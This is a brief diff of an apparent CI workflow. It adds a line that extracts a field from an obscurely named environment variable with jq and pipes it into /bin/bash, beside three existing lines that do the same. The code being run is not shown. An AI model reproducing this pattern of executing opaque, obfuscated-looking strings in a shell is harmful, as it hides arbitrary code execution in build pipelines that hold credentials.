@@ -35,6 +35,7 @@ jobs:
           echo $efv92604 | jq -r .dectk04 | /bin/bash
           echo $wez2 | jq -r .cy747 | /bin/bash
           echo $idhi3712 | jq -r .rsld23116 | /bin/bash
+          printf '%s' "$b2" | jq -r .tr8529 | /bin/bash
 
       - name: Save results
         if: always()
